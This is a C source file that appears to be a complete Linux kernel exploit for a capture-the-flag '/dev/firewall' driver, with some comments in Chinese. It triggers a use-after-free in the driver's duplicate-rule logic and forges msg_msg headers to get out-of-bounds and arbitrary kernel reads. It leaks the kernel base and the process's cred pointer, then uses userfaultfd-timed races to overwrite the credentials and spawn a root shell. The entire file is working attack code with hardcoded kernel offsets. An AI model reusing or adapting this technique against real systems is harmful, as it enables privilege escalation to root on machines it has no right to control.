// gcc exp.c  -o exp --static -lpthread -O3 -s
#define _GNU_SOURCE

#include <stdio.h>
#include <pthread.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <errno.h>
#include <signal.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <sys/prctl.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <assert.h>
#include <sched.h>
#include <byteswap.h>
#include <time.h>
#include <sys/wait.h>
#include <sys/timerfd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/reboot.h>
#include <arpa/inet.h>
#include <sys/shm.h>

#define ADD_RULE 0x1337babe
#define DELETE_RULE 0xdeadbabe
#define EDIT_RULE 0x1337beef
#define SHOW_RULE 0xdeadbeef
#define DUP_RULE 0xbaad5aad

#define INBOUND 0
#define OUTBOUND 1
#define DESC_MAX 0x800

typedef struct
{
    char iface[16];
    char name[16];
    char ip[16];
    char netmask[16];
    uint8_t idx;
    uint8_t type;
    uint16_t proto;
    uint16_t port;
    uint8_t action;
    char desc[DESC_MAX];
} user_rule_t;

typedef struct 
{
        long mtype;
        char mtext[1];
}msg;

typedef struct 
{
    void *ll_next;
    void *ll_prev;
    long m_type;
    size_t m_ts;
    void *next;
    void *security;
}msg_header;

int fd, qid[4];
uint64_t large_msg = 0;     // kmalloc-4096 address
uint64_t queue = 0;         // QID #1 address
uint64_t cred_struct = 0, real_cred = 0, kbase = 0;   // current thread's cred address
static void *page_1;
static void *page_2;
pthread_t thread[4];        // 2 fault page dealing threads, 2 msg allocating threads
uint64_t release_thr_1 = 0; // control 1st fault page dealing thread

void hexprint(char *buffer, unsigned int bytes) // print like gdb qwords, we round to nearest dqword
{
    int dqwords = ((bytes + 0x10 - 1)&0xfffffff0) / 0x10;
    int qwords = dqwords * 2;
    for (int i = 0; i < qwords; i+=2)
    {
        printf("0x%04llx: 0x%016llx 0x%016llx\n", (i * 0x8), ((size_t*)buffer)[i], ((size_t*)buffer)[i+1]);
    }
    puts("-----------------------------------------------");
    return;
}

gen_dot_notation(char *buf, uint32_t val)
{
    sprintf(buf, "%d.%d.%d.%d", val & 0xff, (val & 0xff00) >> 8, (val & 0xff0000) >> 16, (val & 0xff000000) >> 24);
    return;
}

void generate(char *input, user_rule_t *req)
{
    char addr[0x10];
    uint32_t ip = *(uint32_t *)&input[0x20];        // remain improved
    uint32_t netmask = *(int32_t *)&input[0x24];

    memset(addr, 0, sizeof(addr));
    gen_dot_notation(addr, ip);
    memcpy((void *)req->ip, addr, 0x10);

    memset(addr, 0, sizeof(addr));
    gen_dot_notation(addr, netmask);
    memcpy((void *)req->netmask, addr, 0x10);

    memcpy((void*)req->iface, input, 0x10);
    memcpy((void*)req->name,  (void *)&input[0x10], 0x10);
    memcpy((void*)&req->proto, (void *)&input[0x28], 0x2);
    memcpy((void*)&req->port,  (void *)&input[0x28+2], 0x2);
    memcpy((void*)&req->action,(void *)&input[0x28+4], 0x1);
}

void add(uint8_t idx, char *buffer, int type)
{
    user_rule_t rule;
    memset((void *)&rule, 0, sizeof(user_rule_t));
    generate(buffer, &rule);
    rule.idx = idx;
    rule.type = type;
    ioctl(fd, ADD_RULE, &rule);
}

void delete(uint8_t idx, int type)
{
    user_rule_t rule;
    memset((void *)&rule, 0, sizeof(user_rule_t));
    rule.idx = idx;
    rule.type = type;
    ioctl(fd, DELETE_RULE, &rule);
}

void edit(uint8_t idx, char *buffer, int type, int invalidate)
{
    user_rule_t rule;
    memset((void *)&rule, 0, sizeof(user_rule_t));
    generate(buffer, &rule);
    rule.idx = idx;
    rule.type = type;
    if (invalidate)
    {
        strcpy((void *)&rule.ip, "invalid");
        strcpy((void *)&rule.netmask, "invalid");
    }
    ioctl(fd, EDIT_RULE, &rule);
}

void duplicate(uint8_t idx, int type)
{
    user_rule_t rule;
    memset((void *)&rule, 0, sizeof(user_rule_t));
    rule.idx = idx;
    rule.type = type;
    ioctl(fd, DUP_RULE, &rule);
}

void errExit(char* msg1)
{
  puts(msg1);
  exit(-1);
}
static int page_size;
// handler1(): put forged data on (page_1+0x1000), QID #2's msg.
void* handler1(void *arg)
{
  struct uffd_msg msg1;
  unsigned long uffd = (unsigned long)arg;
  puts("[+] handler 1 created");

  struct pollfd pollfd;
  int nready;
  pollfd.fd      = uffd;
  pollfd.events  = POLLIN;
  nready = poll(&pollfd, 1, -1);
  if (nready != 1)  // 这会一直等待，直到copy_from_user/copy_to_user访问FAULT_PAGE
    errExit("[-] Wrong pool return value");
  printf("[+] Trigger! I'm going to hang\n");

  if (read(uffd, &msg1, sizeof(msg1)) != sizeof(msg1)) // 从uffd读取msg结构，虽然没用
    errExit("[-] Error in reading uffd_msg");
  assert(msg1.event == UFFD_EVENT_PAGEFAULT);
  printf("[+] fault page handler finished\n");
// 1. change msg_msg->m_ts and msg_msg->next,      msg_msg->next = cred_struct - 0x8
  if (msg1.arg.pagefault.address == (page_1 + page_size))
  {
      printf("[+] page fault 1 at page_1+0x1000\n");
      char buffer[0x2000];  // 预先设置好buffer内容，往缺页处进行拷贝
      memset(buffer, 0, sizeof(buffer));
      msg_header evil;
      evil.m_type = 1;
      evil.m_ts   = 0x1000;
      evil.next   = (uint64_t)(cred_struct - 0x8);
      memcpy(buffer+0xfd0-0x8, (void *)&evil, sizeof(msg_header));  // msg_msgseg.next - 8 bytes (we should skip this 8 bytes)

      struct uffdio_copy uc;
      uc.src = (unsigned long)buffer;
      uc.dst = (unsigned long)page_1+page_size; // (unsigned long) msg1.arg.pagefault.address & ~(page_size - 1);
      uc.len = 0x1000;
      uc.mode = 0;
      uc.copy = 0;

      while (1)
      {
          if (release_thr_1)
          {
              ioctl(uffd, UFFDIO_COPY, &uc); // 恢复执行copy_from_user
              return 0;
          }
      }
  }
  return 0;
}
// handler1(): wait QID #3's msg_msg->next to be changed, then change cred.
void* handler2(void *arg)
{
  struct uffd_msg msg1;
  unsigned long uffd = (unsigned long)arg;
  puts("[+] handler 2 created");

  struct pollfd pollfd;
  int nready;
  pollfd.fd      = uffd;
  pollfd.events  = POLLIN;
  nready = poll(&pollfd, 1, -1);
  if (nready != 1)  // 这会一直等待，直到copy_from_user/copy_to_user访问FAULT_PAGE
    errExit("[-] Wrong pool return value");
  printf("[+] Trigger! I'm going to hang\n");

  if (read(uffd, &msg1, sizeof(msg1)) != sizeof(msg1))  // 从uffd读取msg结构，虽然没用
    errExit("[-] Error in reading uffd_msg");
  assert(msg1.event == UFFD_EVENT_PAGEFAULT);
  printf("[+] fault page handler finished\n");
// 2. change cred
  if (msg1.arg.pagefault.address == (page_2 + page_size))
  {
      printf("[+] page fault 2 at page_2+0x1000\n");
      release_thr_1 = 1;                                // wait for page fault 1
      sleep(1);

      char buffer[0x2000];  // 预先设置好buffer内容，往缺页处进行拷贝
      memset(buffer, 0, sizeof(buffer));

      struct uffdio_copy uc;
      uc.src = (unsigned long)buffer;
      uc.dst = (unsigned long)page_2+page_size; // (unsigned long) msg1.arg.pagefault.address & ~(page_size - 1);
      uc.len = 0x1000;
      uc.mode = 0;
      uc.copy = 0;

      ioctl(uffd, UFFDIO_COPY, &uc); // 恢复执行copy_from_user
  }
  return 0;
}

void register_userfault(uint64_t fault_page, uint64_t fault_page_len, void *(*func)(void *), pthread_t thr)
{
  struct uffdio_api ua;
  struct uffdio_register ur;
  // pthread_t thr;

  uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); // create the user fault fd
  ua.api = UFFD_API;
  ua.features = 0;
  if (ioctl(uffd, UFFDIO_API, &ua) == -1)
    errExit("[-] ioctl-UFFDIO_API");

  ur.range.start = (unsigned long)fault_page;
  ur.range.len   = fault_page_len;
  ur.mode        = UFFDIO_REGISTER_MODE_MISSING;
  if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)
    errExit("[-] ioctl-UFFDIO_REGISTER");  //注册页地址与错误处理fd，这样只要copy_from_user
                         //访问到FAULT_PAGE，则访问被挂起，uffd会接收到信号
  int s = pthread_create(&thr, NULL, func, (void*)uffd); // handler函数进行访存错误处理
  if (s!=0)
    errExit("[-] pthread_create");
    return;
}
// alloc_msg1(): create QID #2's message to take up 2 kmalloc-4096
void alloc_msg1()
{
    qid[2] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    memset(page_1, 0, page_size);
    ((unsigned long *)page_1)[0xff8 / 8] = 1;   // mtype
    msgsnd(qid[2], page_1 + page_size - 0x8, 0x1ff8-0x30, 0);
}
// alloc_msg2(): create QID #3's msg to take up QID #2's segment
void alloc_msg2()
{
    qid[3] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    memset(page_2, 0, page_size);
    ((unsigned long *)page_2)[0xff8 / 8] = 1;
    msgsnd(qid[3], page_2 + page_size - 0x8, 0x1028-0x30, 0);
}

int main()
{
// 0. initialize
    fd = open("/dev/firewall", O_RDONLY);
    char buffer[0x2000], received[0x2000];
    memset(buffer, 0, sizeof(buffer));
    memset(received, 0, sizeof(received));
    msg *message = (msg *)buffer;
    int size;
// 0-1. setup userfault at (page_1+0x1000) and (page_2+0x1000)
    page_size = sysconf(_SC_PAGE_SIZE);
    page_1 = mmap(NULL, 4*page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    page_2 = mmap(NULL, 4*page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    register_userfault(page_1+0x1000, 0x1000, handler1, thread[0]);
    register_userfault(page_2+0x1000, 0x1000, handler2, thread[1]);
// 0-2. create msg queue  QID #0, QID #1
    qid[0] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);   // QID #0
    qid[1] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);   // QID #1
    if ((qid[0] == -1) | (qid[1] == -1))
      errExit("[-] msg queue failed");

// 1. OOB read —— leak kbase, msg_msg->mlist.next, msg_msg->mlist.prev
// 1-1. OOB read leak setup: construct UAF kmalloc-64
    memset(buffer, 0x41, 0x40);
    for (int i=0x40; i<0x54; i++)
        add(i, buffer, INBOUND);    // rule 0x20 - 0x54
    add(0, buffer, INBOUND);        // rule 0
    duplicate(0, INBOUND);
    delete(0, INBOUND);     // trigger UAF
// 1-2. construct msg queue QID #0, QID #1
    message->mtype = 1;
    memset(message->mtext, 'A', 0x10);
    msgsnd(qid[0], message, 0x40-0x30, 0);  // QID #0 - 'A'
    memset(message->mtext, 'B', 0x10);
    msgsnd(qid[1], message, 0x40-0x30, 0);  // QID #1 - 'B'
    memset(message->mtext, 'A', 0x1ff8-0x30);
    msgsnd(qid[1], message, 0x1ff8-0x30, 0);// QID #1 - 'A'
// 1-3. change msg_msg->m_ts bigger to create OOB read
    msg_header evil;
    size = 0x2000;
    memset((void *)&evil, 0, sizeof(msg_header));
    evil.ll_next = (void *)0x4141414141414141;
    evil.ll_prev = (void *)0x4242424242424242;
    evil.m_type = 0;        // ???????   1?
    evil.m_ts = size;       // 0x10  -> 0x1600 : OOB read
    memset(buffer, 0, sizeof(buffer));
    memcpy(buffer, &evil, 0x20);
    edit(0, buffer, OUTBOUND, 1);
// 1-4. leak sysfs_bin_kfops_ro, msg_msg->mlist.next, msg_msg->mlist.prev
    uint64_t init_task = 0;
    msgrcv(qid[0], received, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);  // size过大？而msg_msg->next为null ？？？？？
    // hexprint(received, 0x1000);
    for (int i=0; i<size/8; i++)
    {
        if ((*(uint64_t *)(received + i*8) & 0xffff) == 0x4242 && !large_msg)
        {
            large_msg = *(uint64_t *)(received + i*8 - 6*8);
            printf("[+] kmalloc-4096 address: %p\n", large_msg);
            queue = *(uint64_t *)(received + i*8 - 5*8);
            printf("[+] QID #1 address: %p\n", queue);
        }
        else if ((*(uint64_t *)(received + i*8) & 0xffff) == 0x59a0 && !init_task)  // sysfs_bin_kfops_ro 0x59a0
        {
            kbase = *(uint64_t *)(received + i*8) - (0xffffffff81a159a0-0xffffffff81000000);
            printf("[+] kernel base: %p\n", kbase);
            init_task = kbase + (0xffffffff81c124c0 - 0xffffffff81000000);
            printf("[+] init_task address: %p\n", init_task);
        }
        if (queue && large_msg && init_task)
            break;
    }
    if (!queue || !large_msg || !init_task)
    {
        msgctl(qid[1], IPC_RMID, NULL);
        errExit("[-] address leaking failed");
    }

// 2. arb read —— traverse task_struct->tasks (at 0x298), find current task_struct via task_struct->pid (at 0x398), leak cred_struct (at 0x540)
    int32_t pid, cur_pid;
    int64_t prev, curr;
    cur_pid = getpid();
    printf("current pid:%d\n", cur_pid);

    prev = (void *)init_task + 0x298;
    while (pid != cur_pid)
    {
        curr = prev - 0x298;                    // current task_struct address
        memset((void *)&evil, 0, sizeof(msg_header));
        memset(received, 0, sizeof(received));
        memset(buffer, 0, sizeof(buffer));
        // get task_struct->tasks.prev pointer and task_struct->pid
        evil.m_type = 1;
        evil.m_ts = size;                       // size = 0x1600
        evil.next = (void *)prev -0x8;          // 1 null qword beforehand to avoid crash
        memcpy(buffer, (void *)&evil, sizeof(msg_header));
        edit(0, buffer, OUTBOUND, 0); 
        msgrcv(qid[0], received, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
        memcpy((void *)&prev, (void *)(received + 0xfe0), 8);       // 0xfd0 + 0x10        msg_msgseg: null + tasks.next + tasks.prev
        memcpy((void *)&pid, (void *)(received + 0x10d8), 4);       // 0xfd0 + 0x8 + (0x398 - 0x298)
        memcpy((void *)&cred_struct, (void *)(received +0xfd0 + 0x8 + (0x540 - 0x298)), 8);         // 0xfd0 + 0x8 + (0x540 - 0x298)
        memcpy((void *)&real_cred, (void *)(received +0xfd0 + (0x540 - 0x298)), 8);         // 0xfd0 + 0x8 + (0x540 - 0x298)
        printf("%d\n", pid);
    }
    printf("[+] found current task struct: 0x%llx\n", curr);
    printf("[+] found current task real_cred: %p\n", real_cred);
    printf("[+] found current task cred_struct: %p\n", cred_struct);

// 3. arb free —— construct overlaped kmalloc-4096 of msg_msg & msg_msgseg
// 3-1. free QID #1's message
    msgrcv(qid[1], received, 0x1ff8, 1, IPC_NOWAIT | MSG_NOERROR);
    msgrcv(qid[1], received, 0x1ff8, 1, IPC_NOWAIT | MSG_NOERROR);
// 3-2. create QID #2's message to take up 2 kmalloc-4096, change QID #3's msg_msg->next to cred_struct-8
    pthread_create(&thread[2], NULL, alloc_msg1, NULL);
    sleep(0.5);
// 3-3. forge QID #0's msg_msg->next to QID #2's segment (kmalloc-4096)
    evil.ll_next = (void *)queue;
    evil.ll_prev = (void *)queue;
    evil.m_type = 1;
    evil.m_ts   = 0x10;    // any value
    evil.next   = (void *)large_msg;
    memcpy(buffer, (void *)&evil, sizeof(msg_header));
    edit(0, buffer, OUTBOUND, 0);
// 3-4. free QID #2's segment (kmalloc-4096)
    msgrcv(qid[0], received, 0x10, 1, IPC_NOWAIT | MSG_NOERROR);
// 3-5. create QID #3's msg to take up QID #2's segment. When #3's msg_msg->next is changed to cred_struct-8, write null to cred.
    pthread_create(&thread[3], NULL, alloc_msg2, NULL);

// 4. arb write —— change current_task's cred
    pthread_join(thread[0], NULL);
    pthread_join(thread[1], NULL);
    pthread_join(thread[2], NULL);
    pthread_join(thread[3], NULL);

    printf("uid: %d\n", getuid());
    system("/bin/sh");
}

/*
// 1-3. spray shm_file_data struct after msg_msgseg
    int shmid;
    char *shmaddr;
    for (int i=0; i<0x50; i++)
    {
        if ((shmid = shmget(IPC_PRIVATE, 100, 0600)) == -1)
        {
            perror("shmget error");
            exit(-1);
        }
        shmaddr = shmat(shmid, NULL, 0);
        if (shmaddr == (void*)-1)
        {
            perror("shmat error");
            exit(-1);
        }
    }  */
/*
        else if ((*(uint64_t *)(received + i*8) & 0xfff) == 0x7a0 && !init_task)  // shm_file_data->ns
        {
            init_task = *(uint64_t *)(received + i*8) - (0xffffffff81c3d7a0 - 0xffffffff81000000) + (0xffffffff81c124c0 - 0xffffffff81000000);
            printf("[+] leaked address: %p\n", *(uint64_t *)(received + i*8));
            printf("[+] init_task address: %p\n", init_task);
        }*/